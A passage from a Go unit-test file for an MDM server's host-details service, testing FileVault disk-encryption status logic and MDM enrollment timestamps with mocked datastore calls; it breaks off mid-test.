package service

import (
	"cmp"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"errors"
	"fmt"
	"iter"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/WatchBeam/clock"
	"github.com/anilyagiz/automdm/v4/pkg/optjson"
	activity_api "github.com/anilyagiz/automdm/v4/server/activity/api"
	"github.com/anilyagiz/automdm/v4/server/authz"
	"github.com/anilyagiz/automdm/v4/server/automdm"
	"github.com/anilyagiz/automdm/v4/server/config"
	authzctx "github.com/anilyagiz/automdm/v4/server/contexts/authz"
	"github.com/anilyagiz/automdm/v4/server/contexts/capabilities"
	hostctx "github.com/anilyagiz/automdm/v4/server/contexts/host"
	"github.com/anilyagiz/automdm/v4/server/contexts/license"
	"github.com/anilyagiz/automdm/v4/server/contexts/viewer"
	"github.com/anilyagiz/automdm/v4/server/datastore/mysql/mysqltest"
	"github.com/anilyagiz/automdm/v4/server/mdm"
	"github.com/anilyagiz/automdm/v4/server/mdm/android"
	apple_mdm "github.com/anilyagiz/automdm/v4/server/mdm/apple"
	"github.com/anilyagiz/automdm/v4/server/mdm/apple/mobileconfig"
	nanodep_client "github.com/anilyagiz/automdm/v4/server/mdm/nanodep/client"
	"github.com/anilyagiz/automdm/v4/server/mdm/nanodep/tokenpki"
	nanomdm "github.com/anilyagiz/automdm/v4/server/mdm/nanomdm/mdm"
	nanomdm_push "github.com/anilyagiz/automdm/v4/server/mdm/nanomdm/push"
	"github.com/anilyagiz/automdm/v4/server/mock"
	mdmmock "github.com/anilyagiz/automdm/v4/server/mock/mdm"
	nanodep_mock "github.com/anilyagiz/automdm/v4/server/mock/nanodep"
	svcmock "github.com/anilyagiz/automdm/v4/server/mock/service"
	"github.com/anilyagiz/automdm/v4/server/platform/endpointer"
	"github.com/anilyagiz/automdm/v4/server/test"
	"github.com/jmoiron/sqlx"
	"github.com/smallstep/pkcs7"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// Fragile test: This test is fragile because of the large reliance on Datastore mocks. Consider refactoring test/logic or removing the test. It may be slowing us down more than helping us.
func TestHostDetails(t *testing.T) {
	ds := new(mock.Store)
	svc := &Service{ds: ds}

	host := &automdm.Host{ID: 3}
	expectedLabels := []*automdm.Label{
		{
			Name:        "foobar",
			Description: "the foobar label",
		},
	}
	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{}, nil
	}
	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) {
		return expectedLabels, nil
	}
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error {
		return nil
	}
	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *automdm.Host) ([]*automdm.HostPolicy, error) {
		return nil, nil
	}
	dsBats := []*automdm.HostBattery{{HostID: host.ID, SerialNumber: "a", CycleCount: 999, Health: "Normal"}, {HostID: host.ID, SerialNumber: "b", CycleCount: 1001, Health: "Service recommended"}}
	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostBattery, error) {
		return dsBats, nil
	}
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		return nil, nil
	}
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) {
		return nil, nil
	}
	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostCustomHostVital, error) {
		return nil, nil
	}
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
		return false, nil
	}

	opts := automdm.HostDetailOptions{
		IncludeCVEScores: false,
		IncludePolicies:  false,
	}
	hostDetail, err := svc.getHostDetails(test.UserContext(context.Background(), test.UserAdmin), host, opts)
	require.NoError(t, err)
	assert.Equal(t, expectedLabels, hostDetail.Labels)
	require.NotNil(t, hostDetail.Batteries)
	assert.Equal(t, dsBats, *hostDetail.Batteries)
	require.Nil(t, hostDetail.MDM.MacOSSettings)
}

// Fragile test: This test is fragile because of the large reliance on Datastore mocks. Consider refactoring test/logic or removing the test. It may be slowing us down more than helping us.
// setupHostDetailsMDMAppleDiskEncryptionMocks stubs what getHostDetails touches
// for a macOS host, except the config and profiles mocks each case sets.
func setupHostDetailsMDMAppleDiskEncryptionMocks(ds *mock.Store) {
	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true}}, nil
	}
	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) {
		return nil, nil
	}
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error {
		return nil
	}
	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *automdm.Host) ([]*automdm.HostPolicy, error) {
		return nil, nil
	}
	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostBattery, error) {
		return nil, nil
	}
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		return nil, nil
	}
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) {
		return nil, nil
	}
	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostCustomHostVital, error) {
		return nil, nil
	}
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*automdm.NanoMDMEnrollmentDetails, error) {
		return &automdm.NanoMDMEnrollmentDetails{}, nil
	}
	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
		return false, nil
	}
	ds.GetHostRecoveryLockPasswordStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMRecoveryLockPassword, error) {
		return nil, nil
	}
	ds.GetHostManagedLocalAccountStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMManagedLocalAccount, error) {
		return nil, nil
	}
	ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*automdm.HostDeviceNameEnforcement, error) {
		return nil, nil
	}
}

func TestHostDetailsMDMAppleDiskEncryption(t *testing.T) {
	ds := new(mock.Store)
	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (automdm.DiskEncryptionConfig, error) {
		// a FileVault profile is only delivered while a macOS setting is on
		return automdm.DiskEncryptionConfig{MacOSEnabled: true, MacOSEscrowEnabled: true}, nil
	}
	svc := &Service{ds: ds}

	setupHostDetailsMDMAppleDiskEncryptionMocks(ds)

	cases := []struct {
		name       string
		rawDecrypt *int
		fvProf     *automdm.HostMDMAppleProfile
		wantState  automdm.DiskEncryptionStatus
		wantAction automdm.ActionRequiredState
		wantStatus *automdm.MDMDeliveryStatus
	}{
		{"no profile", new(-1), nil, "", "", nil},

		{
			"installed profile, no key",
			new(-1),
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryVerifying,
				OperationType: automdm.MDMOperationTypeInstall,
			},
			automdm.DiskEncryptionActionRequired,
			automdm.ActionRequiredRotateKey,
			&automdm.MDMDeliveryPending,
		},
		{
			"installed profile, unknown decryptable",
			nil,
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryVerifying,
				OperationType: automdm.MDMOperationTypeInstall,
			},
			automdm.DiskEncryptionVerifying,
			"",
			&automdm.MDMDeliveryVerifying,
		},
		{
			"installed profile, not decryptable",
			new(0),
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryVerifying,
				OperationType: automdm.MDMOperationTypeInstall,
			},
			automdm.DiskEncryptionActionRequired,
			automdm.ActionRequiredRotateKey,
			&automdm.MDMDeliveryPending,
		},
		{
			"installed profile, decryptable",
			new(1),
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryVerifying,
				OperationType: automdm.MDMOperationTypeInstall,
			},
			automdm.DiskEncryptionVerifying,
			"",
			&automdm.MDMDeliveryVerifying,
		},
		{
			"installed profile, decryptable, verified",
			new(1),
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryVerified,
				OperationType: automdm.MDMOperationTypeInstall,
			},
			automdm.DiskEncryptionVerified,
			"",
			&automdm.MDMDeliveryVerified,
		},
		{
			"pending install, decryptable",
			new(1),
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryPending,
				OperationType: automdm.MDMOperationTypeInstall,
			},
			automdm.DiskEncryptionEnforcing,
			"",
			&automdm.MDMDeliveryPending,
		},
		{
			"pending install, unknown decryptable",
			nil,
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryPending,
				OperationType: automdm.MDMOperationTypeInstall,
			},
			automdm.DiskEncryptionEnforcing,
			"",
			&automdm.MDMDeliveryPending,
		},
		{
			"pending install, no key",
			new(-1),
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryPending,
				OperationType: automdm.MDMOperationTypeInstall,
			},
			automdm.DiskEncryptionEnforcing,
			"",
			&automdm.MDMDeliveryPending,
		},
		{
			"failed install, no key",
			new(-1),
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryFailed,
				OperationType: automdm.MDMOperationTypeInstall,
				Detail:        "some mdm profile install error",
			},
			automdm.DiskEncryptionFailed,
			"",
			&automdm.MDMDeliveryFailed,
		},
		{
			"failed install, not decryptable",
			new(0),
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryFailed,
				OperationType: automdm.MDMOperationTypeInstall,
			},
			automdm.DiskEncryptionFailed,
			"",
			&automdm.MDMDeliveryFailed,
		},
		{
			"pending remove, decryptable",
			new(1),
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryPending,
				OperationType: automdm.MDMOperationTypeRemove,
			},
			automdm.DiskEncryptionRemovingEnforcement,
			"",
			&automdm.MDMDeliveryPending,
		},
		{
			"pending remove, no key",
			new(-1),
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryPending,
				OperationType: automdm.MDMOperationTypeRemove,
			},
			automdm.DiskEncryptionRemovingEnforcement,
			"",
			&automdm.MDMDeliveryPending,
		},
		{
			"failed remove, unknown decryptable",
			nil,
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryFailed,
				OperationType: automdm.MDMOperationTypeRemove,
				Detail:        "some mdm profile removal error",
			},
			automdm.DiskEncryptionFailed,
			"",
			&automdm.MDMDeliveryFailed,
		},
		{
			"removed profile, not decryptable",
			new(0),
			&automdm.HostMDMAppleProfile{
				HostUUID:      "abc",
				Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
				Status:        &automdm.MDMDeliveryVerifying,
				OperationType: automdm.MDMOperationTypeRemove,
			},
			"",
			"",
			&automdm.MDMDeliveryVerifying,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			var mdmData automdm.MDMHostData
			rawDecrypt := "null"
			if c.rawDecrypt != nil {
				rawDecrypt = strconv.Itoa(*c.rawDecrypt)
			}
			require.NoError(t, mdmData.Scan([]byte(fmt.Sprintf(`{"raw_decryptable": %s}`, rawDecrypt))))

			host := &automdm.Host{ID: 3, MDM: mdmData, UUID: "abc", Platform: "darwin"}
			opts := automdm.HostDetailOptions{
				IncludeCVEScores: false,
				IncludePolicies:  false,
			}

			ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMAppleProfile, error) {
				if c.fvProf == nil {
					return nil, nil
				}
				return []automdm.HostMDMAppleProfile{*c.fvProf}, nil
			}
			hostDetail, err := svc.getHostDetails(test.UserContext(context.Background(), test.UserAdmin), host, opts)
			require.NoError(t, err)
			require.NotNil(t, hostDetail.MDM.MacOSSettings)

			if c.wantState == "" {
				require.Nil(t, hostDetail.MDM.MacOSSettings.DiskEncryption)
				require.Nil(t, hostDetail.MDM.OSSettings.DiskEncryption.Status)
				require.Empty(t, hostDetail.MDM.OSSettings.DiskEncryption.Detail)
			} else {
				require.NotNil(t, hostDetail.MDM.MacOSSettings.DiskEncryption)
				require.Equal(t, c.wantState, *hostDetail.MDM.MacOSSettings.DiskEncryption)
				require.NotNil(t, hostDetail.MDM.OSSettings.DiskEncryption.Status)
				require.Equal(t, c.wantState, *hostDetail.MDM.OSSettings.DiskEncryption.Status)
				require.Equal(t, c.fvProf.Detail, hostDetail.MDM.OSSettings.DiskEncryption.Detail)
			}
			// os_settings is platform-agnostic and Windows populates its action_required, so the macOS path has to as
			// well. Otherwise a client reading that one field is told a Mac needing a key rotation has nothing to do.
			if c.wantAction == "" {
				require.Nil(t, hostDetail.MDM.MacOSSettings.ActionRequired)
				require.Nil(t, hostDetail.MDM.OSSettings.DiskEncryption.ActionRequired)
			} else {
				require.NotNil(t, hostDetail.MDM.MacOSSettings.ActionRequired)
				require.Equal(t, c.wantAction, *hostDetail.MDM.MacOSSettings.ActionRequired)
				require.NotNil(t, hostDetail.MDM.OSSettings.DiskEncryption.ActionRequired)
				require.Equal(t, c.wantAction, *hostDetail.MDM.OSSettings.DiskEncryption.ActionRequired)
			}
			if c.wantStatus != nil {
				require.NotNil(t, hostDetail.MDM.Profiles)
				profs := *hostDetail.MDM.Profiles
				require.EqualValues(t, *c.wantStatus, *profs[0].Status)
				require.Equal(t, c.fvProf.Detail, profs[0].Detail)
			} else {
				require.Nil(t, *hostDetail.MDM.Profiles)
			}
		})
	}
}

func TestHostDetailsMDMAppleDiskEncryptionPerPlatformSettings(t *testing.T) {
	ds := new(mock.Store)
	svc := &Service{ds: ds}
	setupHostDetailsMDMAppleDiskEncryptionMocks(ds)

	bothOn := automdm.DiskEncryptionConfig{MacOSEnabled: true, MacOSEscrowEnabled: true}
	enforceOnly := automdm.DiskEncryptionConfig{MacOSEnabled: true}
	escrowOnly := automdm.DiskEncryptionConfig{MacOSEscrowEnabled: true}

	installed := func(status automdm.MDMDeliveryStatus) *automdm.HostMDMAppleProfile {
		return &automdm.HostMDMAppleProfile{
			HostUUID:      "abc",
			Identifier:    mobileconfig.AutoMDMFileVaultPayloadIdentifier,
			Status:        &status,
			OperationType: automdm.MDMOperationTypeInstall,
		}
	}

	cases := []struct {
		name          string
		cfg           automdm.DiskEncryptionConfig
		rawDecrypt    *int
		diskEncrypted *bool
		fvProf        *automdm.HostMDMAppleProfile
		wantState     automdm.DiskEncryptionStatus
		wantAction    automdm.ActionRequiredState
		wantStatus    automdm.MDMDeliveryStatus
	}{
		// enforce-only follows the disk state, the key is irrelevant
		{"enforce only, verified profile, disk encrypted, no key", enforceOnly, new(-1), new(true), installed(automdm.MDMDeliveryVerified), automdm.DiskEncryptionVerified, "", automdm.MDMDeliveryVerified},
		{"enforce only, verified profile, disk not encrypted", enforceOnly, new(-1), new(false), installed(automdm.MDMDeliveryVerified), automdm.DiskEncryptionActionRequired, automdm.ActionRequiredLogOut, automdm.MDMDeliveryPending},
		{"enforce only, verified profile, disk state unknown", enforceOnly, new(-1), nil, installed(automdm.MDMDeliveryVerified), automdm.DiskEncryptionVerifying, "", automdm.MDMDeliveryVerifying},
		{"enforce only, verifying profile, disk encrypted, undecryptable key", enforceOnly, new(0), new(true), installed(automdm.MDMDeliveryVerifying), automdm.DiskEncryptionVerifying, "", automdm.MDMDeliveryVerifying},
		{"enforce only, verifying profile, disk not encrypted, decryptable key", enforceOnly, new(1), new(false), installed(automdm.MDMDeliveryVerifying), automdm.DiskEncryptionActionRequired, automdm.ActionRequiredLogOut, automdm.MDMDeliveryPending},
		{"enforce only, pending profile, disk encrypted", enforceOnly, new(-1), new(true), installed(automdm.MDMDeliveryPending), automdm.DiskEncryptionEnforcing, "", automdm.MDMDeliveryPending},
		// escrow (with or without enforce) follows the key; the disk state only picks the reason when nothing enforces
		{"escrow only, verified profile, decryptable key, disk not encrypted", escrowOnly, new(1), new(false), installed(automdm.MDMDeliveryVerified), automdm.DiskEncryptionVerified, "", automdm.MDMDeliveryVerified},
		{"escrow only, verified profile, no key, disk encrypted", escrowOnly, new(-1), new(true), installed(automdm.MDMDeliveryVerified), automdm.DiskEncryptionActionRequired, automdm.ActionRequiredRotateKey, automdm.MDMDeliveryPending},
		{"escrow only, verified profile, no key, disk not encrypted", escrowOnly, new(-1), new(false), installed(automdm.MDMDeliveryVerified), automdm.DiskEncryptionActionRequired, automdm.ActionRequiredTurnOnEncryption, automdm.MDMDeliveryPending},
		{"escrow only, verified profile, no key, disk state unknown", escrowOnly, new(-1), nil, installed(automdm.MDMDeliveryVerified), automdm.DiskEncryptionActionRequired, automdm.ActionRequiredRotateKey, automdm.MDMDeliveryPending},
		{"both on, verified profile, no key, disk not encrypted", bothOn, new(-1), new(false), installed(automdm.MDMDeliveryVerified), automdm.DiskEncryptionActionRequired, automdm.ActionRequiredRotateKey, automdm.MDMDeliveryPending},
		{"escrow only, verified profile, unchecked key", escrowOnly, nil, new(true), installed(automdm.MDMDeliveryVerified), automdm.DiskEncryptionVerifying, "", automdm.MDMDeliveryVerifying},
		{"both on, verified profile, no key, disk encrypted", bothOn, new(-1), new(true), installed(automdm.MDMDeliveryVerified), automdm.DiskEncryptionActionRequired, automdm.ActionRequiredRotateKey, automdm.MDMDeliveryPending},
		{"both on, verified profile, decryptable key, disk not encrypted", bothOn, new(1), new(false), installed(automdm.MDMDeliveryVerified), automdm.DiskEncryptionVerified, "", automdm.MDMDeliveryVerified},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			var mdmData automdm.MDMHostData
			rawDecrypt := "null"
			if c.rawDecrypt != nil {
				rawDecrypt = strconv.Itoa(*c.rawDecrypt)
			}
			require.NoError(t, mdmData.Scan(fmt.Appendf(nil, `{"raw_decryptable": %s}`, rawDecrypt)))

			host := &automdm.Host{ID: 3, MDM: mdmData, UUID: "abc", Platform: "darwin", DiskEncryptionEnabled: c.diskEncrypted}
			ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (automdm.DiskEncryptionConfig, error) {
				require.Nil(t, teamID)
				return c.cfg, nil
			}
			ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMAppleProfile, error) {
				return []automdm.HostMDMAppleProfile{*c.fvProf}, nil
			}

			hostDetail, err := svc.getHostDetails(test.UserContext(t.Context(), test.UserAdmin), host, automdm.HostDetailOptions{})
			require.NoError(t, err)
			require.True(t, ds.GetConfigEnableDiskEncryptionFuncInvoked)
			ds.GetConfigEnableDiskEncryptionFuncInvoked = false

			require.NotNil(t, hostDetail.MDM.MacOSSettings)
			require.NotNil(t, hostDetail.MDM.MacOSSettings.DiskEncryption)
			require.Equal(t, c.wantState, *hostDetail.MDM.MacOSSettings.DiskEncryption)
			require.NotNil(t, hostDetail.MDM.OSSettings.DiskEncryption.Status)
			require.Equal(t, c.wantState, *hostDetail.MDM.OSSettings.DiskEncryption.Status)
			if c.wantAction == "" {
				require.Nil(t, hostDetail.MDM.MacOSSettings.ActionRequired)
			} else {
				require.NotNil(t, hostDetail.MDM.MacOSSettings.ActionRequired)
				require.Equal(t, c.wantAction, *hostDetail.MDM.MacOSSettings.ActionRequired)
			}
			profs := *hostDetail.MDM.Profiles
			require.Len(t, profs, 1)
			require.EqualValues(t, c.wantStatus, *profs[0].Status)
		})
	}
}

func TestHostDetailsMDMTimestamps(t *testing.T) {
	ds := new(mock.Store)
	svc := &Service{ds: ds}
	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true, WindowsEnabledAndConfigured: true}}, nil
	}
	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) {
		return nil, nil
	}
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error {
		return nil
	}
	ds.LoadHostMDMAppleDeviceVitalsFunc = func(ctx context.Context, host *automdm.Host) error {
		return nil
	}
	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *automdm.Host) ([]*automdm.HostPolicy, error) {
		return nil, nil
	}
	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostBattery, error) {
		return nil, nil
	}
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		return nil, nil
	}
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) {
		return nil, nil
	}
	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetHostGoogleDeviceIDFunc = func(ctx context.Context, hostUUID, customerID string) (string, error) {
		return "", nil
	}
	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostCustomHostVital, error) {
		return nil, nil
	}
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMAppleProfile, error) {
		return nil, nil
	}
	ds.GetHostMDMWindowsProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMWindowsProfile, error) {
		return nil, nil
	}
	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (automdm.DiskEncryptionConfig, error) {
		return automdm.DiskEncryptionConfig{}, nil
	}
	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
		return false, nil
	}
	ds.GetHostRecoveryLockPasswordStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMRecoveryLockPassword, error) {
		return nil, nil
	}
	ds.GetHostManagedLocalAccountStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMManagedLocalAccount, error) {
		return nil, nil
	}
	ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*automdm.HostDeviceNameEnforcement, error) {
		return nil, nil
	}

	ts1 := time.Now().Add(-1 * time.Hour).UTC()
	ts2 := time.Now().Add(-2 * time.Hour).UTC()
	ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*automdm.NanoMDMEnrollmentDetails, error) {
		return &automdm.NanoMDMEnrollmentDetails{
			LastMDMEnrollmentTime:  &ts1,
			LastMDMSeenTime:        &ts2,
			HardwareAttested:       false,
			BootstrapTokenEscrowed: true,
			// Simulate an active enrollment so the details service surfaces
			// LastMDMSeenTime into host.LastMDMCheckedInAt.
			Enabled: true,
		}, nil
	}

	cases := []struct {
		platform        string
		platformIsApple bool
	}{
		{"darwin", true},
		{"ios", true},
		{"ipados", true},
		{"windows", false},
		{"ubuntu", false},
		{"centos", false},
		{"rhel", false},
		{"debian", false},
	}
	for _, testcase := range cases {
		t.Run("test MDM timestamps on platform "+testcase.platform, func(t *testing.T) {
			ds.GetNanoMDMEnrollmentDetailsFuncInvoked = false
			host := &automdm.Host{ID: 3, MDM: automdm.MDMHostData{}, Platform: testcase.platform, UUID: "abc123"}
			opts := automdm.HostDetailOptions{
				IncludeCVEScores:                    false,
				IncludePolicies:                     false,
				ExcludeSoftware:                     true,
				IncludeCriticalVulnerabilitiesCount: false,
			}
			hostDetail, err := svc.getHostDetails(test.UserContext(context.Background(), test.UserAdmin), host, opts)
			require.NoError(t, err)
			if testcase.platformIsApple {
				assert.True(t, ds.GetNanoMDMEnrollmentDetailsFuncInvoked)
				require.NotNil(t, hostDetail.LastMDMEnrolledAt)
				assert.Equal(t, *hostDetail.LastMDMEnrolledAt, ts1)
				require.NotNil(t, hostDetail.LastMDMCheckedInAt)
				assert.Equal(t, *hostDetail.LastMDMCheckedInAt, ts2)
			} else {
				assert.False(t, ds.GetNanoMDMEnrollmentDetailsFuncInvoked)
				assert.Nil(t, hostDetail.LastMDMEnrolledAt)
				assert.Nil(t, hostDetail.LastMDMCheckedInAt)
			}
			if testcase.platform == "darwin" {
				require.NotNil(t, hostDetail.MDM.BootstrapTokenEscrowed)
				assert.True(t, *hostDetail.MDM.BootstrapTokenEscrowed)
			} else {
				assert.Nil(t, hostDetail.MDM.BootstrapTokenEscrowed)
			}
		})
	}

	// Checked-out mobile enrollment: LastMDMCheckedInAt must be nil so
	// /hosts/{id} matches /hosts (nesm join filters enabled=1).
	t.Run("checked-out iPadOS enrollment hides LastMDMCheckedInAt", func(t *testing.T) {
		ds.GetNanoMDMEnrollmentDetailsFuncInvoked = false
		ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*automdm.NanoMDMEnrollmentDetails, error) {
			return &automdm.NanoMDMEnrollmentDetails{
				LastMDMEnrollmentTime: &ts1,
				LastMDMSeenTime:       &ts2,
				Enabled:               false,
			}, nil
		}
		host := &automdm.Host{ID: 4, MDM: automdm.MDMHostData{}, Platform: "ipados", UUID: "checked-out-uuid"}
		hostDetail, err := svc.getHostDetails(
			test.UserContext(context.Background(), test.UserAdmin),
			host,
			automdm.HostDetailOptions{ExcludeSoftware: true},
		)
		require.NoError(t, err)
		require.NotNil(t, hostDetail.LastMDMEnrolledAt)
		require.Nil(t, hostDetail.LastMDMCheckedInAt, "checked-out mobile enrollment must not expose LastMDMCheckedInAt on /hosts/{id}")
	})

	// macOS host details keep surfacing LastMDMCheckedInAt regardless of
	// enrollment state — HostHeader.tsx renders it as an informational
	// timestamp, and Host.mobileStatus doesn't apply to darwin.
	t.Run("checked-out macOS enrollment still exposes LastMDMCheckedInAt", func(t *testing.T) {
		ds.GetNanoMDMEnrollmentDetailsFuncInvoked = false
		ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*automdm.NanoMDMEnrollmentDetails, error) {
			return &automdm.NanoMDMEnrollmentDetails{
				LastMDMEnrollmentTime: &ts1,
				LastMDMSeenTime:       &ts2,
				Enabled:               false,
			}, nil
		}
		host := &automdm.Host{ID: 5, MDM: automdm.MDMHostData{}, Platform: "darwin", UUID: "checked-out-mac-uuid"}
		hostDetail, err := svc.getHostDetails(
			test.UserContext(context.Background(), test.UserAdmin),
			host,
			automdm.HostDetailOptions{ExcludeSoftware: true},
		)
		require.NoError(t, err)
		require.NotNil(t, hostDetail.LastMDMCheckedInAt, "checked-out macOS enrollment should still expose LastMDMCheckedInAt on /hosts/{id}")
		require.Equal(t, ts2, *hostDetail.LastMDMCheckedInAt)
	})

	// When Apple MDM is turned off, /hosts still reads nstm.seen_time via
	// the unconditional LEFT JOIN. /hosts/{id} must do the same — the nano
	// read is hoisted above the MDM-configured guard so both endpoints
	// return the same LastMDMCheckedInAt for a host whose nano row survives
	// an MDM shutoff.
	t.Run("Apple MDM disabled still exposes LastMDMCheckedInAt", func(t *testing.T) {
		ds.GetNanoMDMEnrollmentDetailsFuncInvoked = false
